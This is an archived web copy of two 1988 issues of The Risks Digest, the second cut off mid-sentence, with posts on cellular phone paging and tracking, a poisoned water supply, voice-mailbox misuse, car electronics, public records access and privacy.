<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Computers in local govt - a burning issue?
</A>
</H3>
<address>
Dave Horsfall 
&lt;<A HREF="mailto:dave@stcns3.stc.oz.au">
dave@stcns3.stc.oz.au
</A>&gt;
</address>
<i>
Fri, 23 Sep 88 09:47:42 est
</i><PRE>

Just read in the daily paper that a mayor ordered the air-conditioning
in a computer room to be turned off, as the noise was interfering with
the council meeting.  Unfortunately, no-one ordered it turned on again,
and the staff turned up next morning to find one cooked computer...

Dave Horsfall (VK2KFU),  Alcatel-STC Australia,  dave@stcns3.stc.oz
dave%stcns3.stc.OZ.AU@uunet.UU.NET,  ...munnari!stcns3.stc.OZ.AU!dave

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
North Cornwall water supply polluted
</A>
</H3>
<address>
Willie Smith, LTN Components Eng.
&lt;<A HREF="mailto:w_smith%wookie.DEC@decwrl.dec.com ">
w_smith%wookie.DEC@decwrl.dec.com 
</A>&gt;
</address>
<i>
26 Sep 88 14:11
</i><PRE>

A combination of circumstances at an unattended water-works caused the
pollution of the water-supply to 22,000 homes in north Cornwall by aluminium
sulphate last July.  

The following scenario was given by a TV programme last week.  A relief driver
was asked to deliver 20 tons of aluminium sulphate to an unattended waterworks.
He was given a key to open the gate by the normal driver.  This key should not
have been available to the driver.  The tank to store the aluminium sulphate
was unlabeled, and the driver dumped his load into an underground reservoir of
treated water.  This water entered the water distribution system, now
containing a amount of aluminium 500 times the maximum permitted.  The water
was now acidic (sulphuric acid), and started dissolving lead and copper from
the pipes.

When notified of a problem, the water board discovered a mal-functioning pump.
They repaired this and dumped the contents of the reservoir into the river,
poisoning thousands of fish and other river life.  They stated the water was
now safe to drink.  (It wasn't!!).  Many animals died, and humans suffered much
pain and discomfort.  The long term affects of the pollution are unknown.

What has this to do with computing RISKS?  The waterworks was automated, but
all measuring devices were on the intake side of the waterworks.  Designers had
omitted to monitor the water exiting the works and entering the public supply,
thus ensuring that the above sequence of errors was not picked up until the
water reached the consumers!
  
BTW, under British Law, no crime has been committed.
 
</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Re: Risks of cellular telephones [RISKS 7.57]
</A>
</H3>
<address>
&lt;<A HREF="mailto:ark%hoder@CS.RIT.EDU">
ark%hoder@CS.RIT.EDU
</A>&gt;
</address>
<i>
Mon, 26 Sep 88 10:25:53 EDT
</i><PRE>

Chuck Weinstock asks how an incoming call is placed to a cellular telephone,
and whether Big Brother could somehow use this to monitor persons'
whereabouts.  I used to work on cellular telephone switching system software,
so I'll take a stab at it.

When a call is placed to a cellular telephone, a "paging" message is
broadcast in all the cells in the system.  Certain frequencies are set
aside solely for paging.  All active cellular telephones are constantly
monitoring the paging channel.  When a phone detects a paging message with
its own address, it broadcasts a page response message.  This response is
received by all the cells in the system, and the signal strength is measured.
The cell receiving the strongest response is assumed to be the cell in which
the phone is located, an unused frequency in that cell is assigned, and the
phone call is switched to a transceiver in that cell.

So cellular telephones are indeed located by a broadcast message, not by
having the phones transmit periodic "here I am" messages.  If no one is
calling a particular cellular telephone, there is no way to know where that
phone is.  HOWEVER ...

While a cellular telephone call is in progress, the phone may move into a
different cell.  If it does, the call must be "handed off:" the connection
must be switched from the transceiver in the current cell to an unused
transceiver in the new cell, usually on a different frequency.  The current
transceiver constantly monitors the phone's signal strength; when it falls
below a threshold, a handoff is needed.  All the cells broadcast another
paging message to the phone, the phone responds, the signal strengths are
measured, and the cell receiving the strongest signal is the new cell.

Thus, _while_a_cellular_telephone_call_is_in_progress_ (either incoming or
outgoing), the system knows the cell in which your phone is located, and
unscrupulous parties could abuse this information.  In between calls, you're
safe.

As for business competitors monitoring calls you place on your cellular
telephone, to find out your clients' phone numbers:  This is perfectly
possible.  However, you'd have to get your hands on the radio equipment used
in a cell's base station, plus its controlling software, and change the
software to record information about calls being placed.  This is probably
beyond most business persons' capabilities.  One hopes the FCC, police, etc.
would prevent anyone from offering such a product commercially.

Alan Kaminsky, School of Computer Science, Rochester Institute of Technology,
P. O. Box 9887, Rochester, NY  14623                            716-475-5255

</PRE>
<HR><H3><A NAME="subj3.2">
Re: Risks of Cellular Phones? (<A HREF="/Risks/7.57.html">RISKS-7.57</A>)
</A>
</H3>
<address>
John Gilmore
&lt;<A HREF="mailto:gnu@toad.com ">
gnu@toad.com 
</A>&gt;
</address>
<i>
Sun, 25 Sep 88 17:04:09 PDT
</i><PRE>

&gt; If I dial a phone number attached to a cellular phone, how does the
&gt; cellular system know which cell should send the ring signal to the phone?

The standard for communication between a cellular telephone and a base
station is EIA Interim Standard IS-3-C (June 1986).  I got my copy in Feb
1987 from Global Engineering Documents at +1 800 854 7179 or +1 714 261 1455.

At cellular phone power-up, the phone listens on a set of fixed
frequencies for a control message ("overhead message") telling it which
channels are locally used as paging channels.  It then listens to all
those channels, picks the one with the highest signal strength, and
listens on that channel for overhead messages and "mobile control
messages".  One such control message is a "page", which indicates that
the land system wishes to get in touch with a particular mobile
(identified by its phone number).  In a simple cellular system, this
"page" would probably be sent by all cells; in a more complex system,
it could be initially sent in a likely cell or cells, and later
sent in all cells if no response was heard.

When a cellular phone receives a "page", it responds by transmitting
a "page response" on a "reverse control channel".  This tells the land
system that the page has been received, and specifies which transmitter's
page it heard.  That cell will respond with an "initial voice channel
designation" message, if it has a free voice channel.  The phone responds
by transmitting an audio tone on that channel to indicate that it
has seized the channel.  Then the land station sends an "alert" message
which causes the phone to ring its audible bell.  If and when you answer
the phone, it turns off the audio tone and starts transmitting
your voice.

As you can see, it's possible for the cellular system to "page" your
phone and establish its whereabouts without ever sending an "alert",
which would let you know that your phone was active.  In fact, there is
another order called "audit" which causes the phone to silently
transmit a message back to the system, without ever telling you.  In
some cases it appears that the audit response includes the phone's serial
number as well as its phone number.

In normal operation a cellular phone will not transmit unless it is
paged or you ask it to make a call.  There is no ongoing tracking of
idle phones, though specific phones could be targeted for tracking
by sending periodic "page" and "audit" messages to them.

If you want privacy I recommend not using a cellular phone.  A possible
compromise would be to get a paging beeper and a cellular phone.  Leave
the beeper on all the time and power off the phone.  The beepers have
batteries that last for a month anyway, while the phone will die in
hours if on.  When someone wants to talk with, they call your beeper and
punch in their number and/or a prearranged code.  You receive the beep,
but your beeper does not transmit any response.  If you choose to
respond, you can power on your phone, dial back to whoever beeped you,
talk, then power off the phone.  You can only be traced for the duration
of the call (and, of course, the call is on the radio so it can be
overheard).  I'm actually surprised that I haven't seen cellular phones
with built in beepers like this, since it extends your battery life.

If your cellular phone was modified to present itself to the system as a random
phone number and serial number (most conveniently obtained from recent traffic
heard over the air by the phone, since it isn't encrypted), you would not be
traceable at all -- nor would you be billed for the call.  (Your phone's
transmission could be traced, but there is nothing to tie it to "you").  Making
calls that are charged to other people is against the law of course, but seems
to be common practice; there's an "underground" traffic in phones with this
kind of modified firmware.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
 Other voice mailbox risks reported
</A>
</H3>
<address>
&lt;<A HREF="mailto:Bahn@PCO-MULTICS.HBI.HONEYWELL.COM">
Bahn@PCO-MULTICS.HBI.HONEYWELL.COM
</A>&gt;
</address>
<i>
Sun, 25 Sep 88 12:39 MST
</i><PRE>

   A local company specializing in hardware for the US Government has
been cooperating with the FBI into an investigation of illegal use of
their voice mail system.  Recently when they hired a new employee when
they wanted to set him up a voice mail box they discovered the password
had been changed for the system administrator.  Technical support from
INTELLICOM (the manufacturer) determined that someone had created
several new voice mailboxes and were using them for credit card data.
Apparently the passwords had never been set when the VMB was received
from the manufacturer.  Intellicom has advised all their customers who
use these systems to also disconnect their 800 service outside of
hours as this serves to deter miscreants from inhabiting your VMB.

     This appears to be a criminal twist on previous risks reported.  Peter.

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Auto Computers vs. radios
</A>
</H3>
<address>
Steve Jay
&lt;<A HREF="mailto:shj@ultra.UUCP ">
shj@ultra.UUCP 
</A>&gt;
</address>
<i>
Sat, 24 Sep 88 19:42:59 PDT
</i><PRE>

In RISKS 7.57, Chuck Weinstock writes (regarding his friend's Ford Probe
going nuts when a computer was plugged into the cigarette lighter):

&gt; One wonders if a radar detector or a cb radio (two common appliances that use
&gt; the cigarette lighter) would cause the same difficulty.

The owners manual for my 1988 Mazda 626 (mechanically the same as Ford Probe)
has the following warning:

  "If a mobile two-way radio system is installed improperly, or if a wrong
  type is used, the fuel injection system and the cruise control system may
  be affected.  To avoid damage to your vehicle, be sure to check with an
  Authorized Mazda Dealer for proper installation of a mobile two-way radio."

The Shop Manual (the one they would sell me) contains an almost impossible to
interpret diagram that attempts to show where NOT to run the antenna lead for
a radio transmitter.  There is no information about what "a wrong type" might
be.  I sure hope my Authorized Mazda Dealer has better information.

I wonder if the thousands of places that will install a CB radio for you are
aware of the danger of doing it improperly in a Mazda. (I don't mean to pick
just on on Mazda.  I suspect the same is true for lots of cars.)  Also, given
that malfunction of the fuel injection system and/or cruise control could do
damage to people, not just the vehicle, the warning should be a lot more
prominent.  I have no idea how the warning could be made available to whoever
might own my car 15 years from now.

Maybe the Army should publish the locations of the radio transmitters that do
in their helicopters, so I can avoid driving near them.

Steve Jay, Ultra Network Technologies, 101 Daggett Drive, San Jose, CA 95134
Internet: ultra!shj@ames.arc.nasa.gov uucp: ...ames!ultra!shj  408-922-0100

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
 State Records via Computer
</A>
</H3>
<address>
&lt;<A HREF="mailto:Curtiss@DOCKMASTER.ARPA">
Curtiss@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Sun, 18 Sep 88 15:12 EDT
</i><PRE>

From FLORIDA TODAY, Melbourne, Florida (a Gannett Company) without permission:

  TALLAHASSEE- For private investigators, the tools of the trade used to be
  trench coats, binoculars and soft shoes.  But that was before the
  revolution.  Now, private investigators are just as likely to be huddled
  over computer screens as they are to be hanging out in the bushes.
     Like a growing number of states, Florida last month set up a computer
  link that makes driver license and vehicle registration records available to
  anyone with a computer.  To access corporate records, it costs $25 an hour,
  not including membership fees to Compuserve, which runs the system.  For
  highway department records, it costs $60 an hour, and users have to deposit
  money in advance.  Last year the state made about $80,000 from fees on the
  service.
     [Quotes from users]
     State officals say they're banking on the adage that time is money.  The
  potential of saving time, and therefore tax money, is one of the reasons
  they expanded the program.
     The program was started in 1986 after the Division of Corporate Records
  did a study that showed the agency was only responding to 15 percent of the
  requests for corporate information, said David Mann, director of the
  division.  "It was a way to get heavy users off the system," he said of the
  computer link.  "It worked like a charm, and it didn't cost the state any
  money."
     Since installing the computer link, about 13,000 of the 70,000
  requests the agency gets each day are being handled by the computer.
  And its response rate is now about 45 percent, he said.
     [more quotes from users]
     With the push of a button, a law firm can tell a client whether a
  corporate name he wants to use is already in use, whether a corporation
  interested in buying a piece of property may be on shaky financial
  ground and who the corporate officers are.
     Mann and David Jacobson, of the motor vehicles agency, said hundreds of
  firms from Seattle, Wash., to New York City have signed up for the service.
  The firms include insurance companies, banks, labor unions and law firms.
  But the prime users appear to be private investigators.  Both Mann and
  Jacobson agree that it's likely the system will be expanded as it proves its
  usefulness.  Mann and Jacobson also said steps have been taken to avoid
  state records tampering.

Part of the drive behind allowing computer access to state records is
Florida's "Sunshine Law".  A previous article said that only the
information listed on your driver's license and vehicle registration
will be available.  This information is ruled to be information of
public record.  Driving infraction histories will not be accessable.

William Curtiss

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Damage by Disney 3-D glasses
</A>
</H3>
<address>
&lt;<A HREF="mailto:jurjen%cwi.nl@RELAY.CS.NET   [NO! KLOSSNER]">
jurjen%cwi.nl@RELAY.CS.NET   [NO! KLOSSNER]
</A>&gt;
</address>
<i>
Mon, 19 Sep 88 13:24:34 PDT
</i><PRE>

&gt; "Please do not take these glasses as a souvenir.  
&gt; They will impair your vision outside this theatre."

The sentence is literally true.  The glasses are not completely
transparent; they absorb a small fraction of the light passing through,
and so one's vision, while wearing the glasses, is impaired.

Until reading this posting, I never considered the more sinister
interpretation, that one's vision would be permanently impaired.

  -=- Andrew Klossner   (decvax!tektronix!tekecs!andrew)       [UUCP]
                        (andrew%tekecs.tek.com@relay.cs.net)   [ARPA]

    [Also noted by "Robert J. Reschly Jr." &lt;reschly@BRL.MIL&gt;
                    linden@Sun.COM (Peter van der Linden)
                    seanf@ucscc.UCSC.EDU (Sean Fagan)
                    jurjen@cwi.nl (Jurjen N.E. Bos, CWI, Amsterdam)
                    roskos@ida.org (Eric Roskos)   ]

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
  re: more on killer remote controlls
</A>
</H3>
<address>
GREENY 
&lt;<A HREF="mailto:MISS026@ECNCDC.BITNET">
MISS026@ECNCDC.BITNET
</A>&gt;
</address>
<i>
Mon 19 Sep 1988 16:09 CDT
</i><PRE>

&gt; Caution: Use of this remote on another TV set could damage it...(or something
&gt; along those lines....)

I find it *VERY* hard to believe that anyone would believe this claim by a
hotel.  This is simply a way to keep moronic, paranoid people who want to be
a cleptomaniac for a day from stealing the remote control (as if it would
actually work on their TV set at home...:-&gt; )

To date, I have about 10 IR controls in and about my house and I have found
only two of them that have signals close enough to cause problems (they are
eaisly worked around...but still).  And I find it even harder to believe that
an IR control could be engineered to "figure out" what type of signal was
sent to your TV to turn it on/off, and to do so at such a pulse rate as to cause
your TV to die....nope, just cant believe it.  Maybe it could be done if they
knew what kind of TV you had at home, but why?  Basically, if the hotel in
question had any brains at all, they would simply install a proximity type
detector and put one of those little metal strips inside of the control.  Then
when you left your room, an alarm would sound.  And to further reduce costs,
ONE detector could be installed at the bottom of the stairs or other heavily
used guest exit point....

..I guess this is just one more example of how gullible the public really is...
Greeny

Bitnet: MISS026@ECNCDC

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.57.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.59.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-11</DOCNO>
<DOCOLDNO>IA012-000131-B034-219</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.59.html 128.240.150.127 19970217023251 text/html 19742
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:31:18 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 59</TITLE>
<LINK REL="Prev" HREF="/Risks/7.58.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.60.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.58.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.60.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 59</H1>
<H2> Thursday 29 September 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Arthur Miller, Assault on Privacy: Computers, Data Banks and Dossiers    
</A>
<DD>
<A HREF="#subj1.1">
Barry C. Nelson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  EPROM is not necessarily programmed for life 
</A>
<DD>
<A HREF="#subj2.1">
Mike Linnig
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  The Wobbly Goblin (a.k.a. Stealth fighter) 
</A>
<DD>
<A HREF="#subj3.1">
Alan Kaminsky
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Re: Stanford Collider Shut Down 
</A>
<DD>
<A HREF="#subj4.1">
Matthew P Wiener
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: Is Uncle Sam selling your name to mailing lists?    
</A>
<DD>
<A HREF="#subj5.1">
Greg Pflaum via Mark Brader
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  CPSR 1988 Annual Meeting 
</A>
<DD>
<A HREF="#subj6.1">
Gary Chapman
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Arthur Miller, Assault on Privacy: Computers, Data Banks and Dossiers
</A>
</H3>
<address>
"Barry C. Nelson" 
&lt;<A HREF="mailto:bnelson@ccb.bbn.com">
bnelson@ccb.bbn.com
</A>&gt;
</address>
<i>
Wed, 28 Sep 88 11:03:40 EDT
</i><PRE>

The American Society for Industrial Security is holding its annual seminar and
exhibition in Boston at the moment.  There were nearly 3000 registered
attendees, not including over 350 companies with product or service exhibits.

The luncheon speech on 27 Sept was by Arthur Miller, Professor of Law at
Harvard University, renowned author on court procedures and legal expert
appearing on TV programs such as "Good Morning America." He is author of "The
Assault on Privacy: Computers, Data Banks and Dossiers" which is considered
"must" reading on the issue.

Let me pass on a few of his remarks which were addressed to the thousands of
security professionals from all over the country. It was shrill, but compelling.
(Consider that MOST of the listeners know nothing about computers.)

Barry C. Nelson
+++++++++++++++  The following is provided without permission and may be
available on tape from National Audio-Visual Transcripts, Ltd. +++++++++++

"...
I warn you, I'm a card-carrying privacy nut.
...
You can't get very far in this world without your dossier being there first.

Flight Reservation systems decide whether or not you exist. If your information
isn't in their database, then you simply don't get to go anywhere
...
What people have been reduced to are mere 3-D representations of their own data.

The Avis WIZARD decides if you get to drive a car. Your head won't touch the
pillow of a Sheraton unless their computer says it's okay.  
...
This information forms a permanent "dossier".  It's THEIR information now.

They know your name, address, telephone number, credit card numbers, who ELSE
is driving the car "for insurance", ...  your driver's license number. In the
state of Massachusetts, this is the same number as that used for Social
Security, unless you object to such use. In THAT case, you are ASSIGNED a
number and you reside forever more on the list of "weird people who don't give
out their Social Security Number in Massachusetts."
...
YOU can't get a copy of these records. There is no law which forces private
agencies to tell YOU what they know in most cases.
...
Data is a lot like humans. It is born. Matures. Gets married to other data,
divorced. Gets old. One thing that it doesn't do is die. It has to be killed.
...
At the same time, data is dehumanizing.  Take the case of a person, flesh and
blood, who wants to go to law school. A six-page form is filled out and gets
"processed" by the computer along with transcripts and LSAT scores. ...

Eventually an "index number" is spit out. This number is then put on the Great
Chart on the Wall with a lot of others. 

This person, whose only crime in life was wanting to go to law school, has been
reduced to a DOT on the wall awaiting evaluation.
...
What should we be doing about all of this?  Adjusting the regulations a little.
...
Only the information which is necessary for the job at hand should be collected.

People should have access to the data which you have about them.  There should
 be a process for them to challenge any inaccuracies.

There should be more control on the eventual uses of data which was supplied
 for some business at hand, but has been sent elsewhere "upon request"

Old data should be killed when its useful life is served.

Data must be protected from those who would abuse it.  ..."

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
EPROM is not necessarily programmed for life
</A>
</H3>
<address>
&lt;<A HREF="mailto:linnig@skvax1.csc.ti.com">
linnig@skvax1.csc.ti.com
</A>&gt;
</address>
<i>
Wed, 28 Sep 88 09:23:18 CDT
</i><PRE>
&gt; I can't answer the question, but note that, for software operating in
&gt; the occasionally high-radiation environment of space, "being in ROM"
&gt; doesn't mean "can't be overwritten."

Unless things have changed in the past few years... 

UV erasable EPROM's only stay programmed for a few years (~7).  These
chips bury a charge inside of an insulating layer.  UV exposure causes
the charge to be erased, so does the passage of time.

I wonder how many computerized boxes out there are carry their programs
in EPROM?   Sounds like a ticking time bomb to me.

	Mike Linnig, 	Texas Instruments

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
The Wobbly Goblin (a.k.a. Stealth fighter)
</A>
</H3>
<address>
&lt;<A HREF="mailto:ark%hoder@CS.RIT.EDU">
ark%hoder@CS.RIT.EDU
</A>&gt;
</address>
<i>
Wed, 28 Sep 88 07:20:32 EDT
</i><PRE>

"How Wobbly the Goblin"  (Time magazine, October 3, 1988, p. 29)

"The U.S. Air Force is so secretive about its radar-invisible Stealth
fighter that it refused to acknowledge the plane existed even when one
crashed in California two years ago.  Yet when a covey of U.S.A.F. pilots
converged in Washington last week for an Air Force Association symposium,
shop talk indicated that the Stealth has a nickname.  Pilots who fly the
plane out of the Tonopah, Nev., Air Force base find it so tricky they
call it the "Wobbly Goblin."  Onboard computers are supposed to control
the Stealth's performance, even at the highest speeds, but experts say
the plane sometimes "gets away" from the pilot, who then has to take over
manually--and earn his wings all over again."

Does anyone know any details?

Alan Kaminsky, School of Computer Science, P.O. Box 9887, Rochester, NY 14623
Rochester Institute of Technology                                716-475-5255

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Re: Stanford Collider Shut Down  &lt;RISKS DIGEST 7.51&gt;
</A>
</H3>
<address>
Matthew P Wiener
&lt;<A HREF="mailto:weemba@garnet.Berkeley.EDU ">
weemba@garnet.Berkeley.EDU 
</A>&gt;
</address>
<i>
Sat, 24 Sep 88 23:57:36 pdt
</i><PRE>

&gt;Stanford University's $115 million linear collider has been shut down
&gt;after several months' efforts failed to get it running properly.

Is this *permanent*?  I read only a month ago in SCIENCE (or NATURE?)
that they were still expecting to get results next year.

SLAC itself is not in trouble so much as the redesign for making it a
Z factory.  Of course, there could be repercussions.

&gt;Although there seems to be nothing basically wrong with the system, it
&gt;is "simply so complicated that, despite the best efforts of more than
&gt;100 people, they have not been able to keep all its complex parts
&gt;working together long enough to get results."

Also, because they were in a hurry to beat CERN with the first Z factory,
they used the cheapest parts they could find.  They are paying for this now.

One good consequence is that SLAC has proven that the basic design for
using linacs to mass produce Zs is sound.  Nothing like it had been
tried before.  I vaguely recall reading somewhere that inspired by
SLAC's "success", in West Germany there are plans to build a similar
linac-based Z factory.

&gt;					        Since spring they have
&gt;"fought a succession of glitches and breakdowns in the machine's myriad
&gt;magnets, computer controls, and focusing devices."

The outside weather did not help either.

ucbvax!garnet!weemba	Matthew P Wiener/Brahms Gang/Berkeley CA 94720

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Re: Is Uncle Sam selling your name to mailing lists?
</A>
</H3>
<address>
Mark Brader 
&lt;<A HREF="mailto:msb@sq.sq.com">
msb@sq.sq.com
</A>&gt;
</address>
<i>
Thu, 22 Sep 88 10:37:55 EDT
</i><PRE>

Path: sq!geac!yunexus!utzoo!utgpu!water!watmath!clyde!att!osu-cis!tut.[]
   cis.ohio-state.edu!mailrus!ames!necntc!dandelion!ulowell!interlan!pflaum
From: pflaum@interlan.UUCP (Greg Pflaum)
Newsgroups: misc.consumers
Date: 19 Sep 88 23:05:24 GMT
Organization: MICOM-Interlan, Boxborough, MA (1-800-LAN-TALK)

In article &lt;2123@edsews.EDS.COM&gt; peter@edsews.EDS.COM (Peter Zadrozny) writes:
&gt;For the last two weeks I've been swamped with pre-approved
&gt;credit cards and loans, at least three offers every day from
&gt;different banks. The strange part is the they are all addressed
&gt;to my legal name which is only known by Uncle Sam and his red tape
&gt;offices. Is anyone of them selling names and addresses
&gt;to mailing lists houses??? What's going on, are they going
&gt;to pay the public debt this way?

It is possible that, at some point in the distribution, someone illegally
obtained a tape of names, addresses and other information from some
government database.

I've seen a similar situation when I was in school at the University of
Massachusetts.  I received a mailing from a life insurance company which
was addressed to "The parents of Greg Pflaum".  Because UMass did not
have my parents' address, I often got mail from the school with that
address.  Checking around, I found that those friends who also received
UMass's "To the parents of" mail had also received the insurance
solicitation.  I didn't check with any parents, but clearly at least
some group of parents also got it.

At the office that produces the university magazine (Contact) that is
sent to all parents I learned that mailing labels were ordered from a
central office which did the database selection and printing.  That
was as far as I got.  They said the school did not sell mailing lists,
and refused to believe there was any connection between the insurance
mailing and the UMass database.  "Maybe someone went through the
phone book," they suggested.  Sheesh.

A student who did programming for the school suggested the most likely answer:
a programmer or operator made a few bucks on the side.
                                                               Greg

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
CPSR 1988 Annual Meeting
</A>
</H3>
<address>
Gary Chapman
&lt;<A HREF="mailto:chapman@csli.Stanford.EDU ">
chapman@csli.Stanford.EDU 
</A>&gt;
</address>
<i>
Sat, 24 Sep 88 14:07:06 PDT
</i><PRE>

            Computer Professionals for Social Responsibility
                            Annual Meeting
               November 19 and 20 at Stanford University


A collection of nationally known authors, scientists, and innovators in the
computer science field will address the issues of computers and their impact on
the arms race, the workplace, education, and society at the l988 Annual Meeting
of Computer Professionals for Social Responsibility (CPSR), to be held November
19 and 20, l988, in Cubberley Auditorium at Stanford University.

Two sessions that already are generating a great deal of interest will draw
together experts from a wide variety of fields to comment on developments in
technology that could affect the general population.

The first, Privacy, Computers, and the Law, deals with the FBI's plans to
upgrade its already massive criminal justice database so that it can better
identify individuals. The current system now contains over l9 million records
and is accessed up to half a million times per day.  Would an improved version
threaten the privacy and liberties of citizens?  Discussing the issues from a
variety of perspectives will be: William A. Bayse, FBI assistant director for
technical services;  Congressman Don Edwards (D-San Jose), chairman of the
House Subcommittee on Civil and Constitutional Rights;  Jerry Berman, chief
legislative counsel of the American Civil Liberties Union and director of the
ACLU Privacy and Technology Project; and Peter Neumann, SRI International and
CPSR/Palo Alto. 

The second panel will debate the impact of the personal computer of the future
as presented in Apple Computer's video story, "Knowledge Navigator." The
speculative Knowledge Navigator is a flat, notebook-sized computer that can
speak with the user, explore databases on its own,  do simulations, and display
a picturephone and graphics, all by voice command.  Addressing the social
assumptions and implications of this possible technology will be:  Larry
Tesler, vice president of Advanced Technology, Apple Computer; Esther Dyson,
editor and publisher of Release 1.0 newsletter; Fernando Flores, chairman of
Action Technologies and co-author of Understanding Computers and Cognition;
Peter Lyman, director of educational computing, University of Southern
California; Theodore Roszak, professor of sociology, California State
University at Hayward and author of The Cult of Information.

Speaking on the topic Technical Challenges in Arms Control in the Next 15 Years
is Sidney Drell.  Dr. Drell serves as co-director of the Stanford Center for
International Security and Arms Control and deputy director of the Stanford
Linear Accelerator Center.  He also is past president of the American Physical
Society and author of Facing the Threat of Nuclear Weapons.  

Technology, Work, and Authority in the Information Age:  The Role of the
Computer Professional  will address the opportunities and problems of computers
in the workplace.  By the end of the century, approximately two-thirds of all
workers will use a computer terminal .  Will that computer enhance their skills
or assist management in controlling workers?  Speaker Robert Howard, author of
the book Brave New Workplace  and senior editor of Technology Review  will
focus on what role computer designers can do to create socially responsible
products.  

Women learn how to use computers differently than men, says speaker Deborah
Brecher, founder and executive director of the Women's Computer Literacy
Program in San Francisco.  Women and Computers: Does Gender Matter?  will cover
what programmers, educators and employers need to know about computer learning
and the sexes.

Computer pioneer Jim Warren will  deliver the keynote speech  at CPSR's Annual
Banquet to be held at Ming's Villa in Palo Alto.  Mr. Warren founded The
Intelligent Machines Journal  which .later  became InfoWorld.   He also started
the West Coast Computer Faire, the pre-eminent show for personal computer users
and hobbyists, was the founding director of the first personal computer
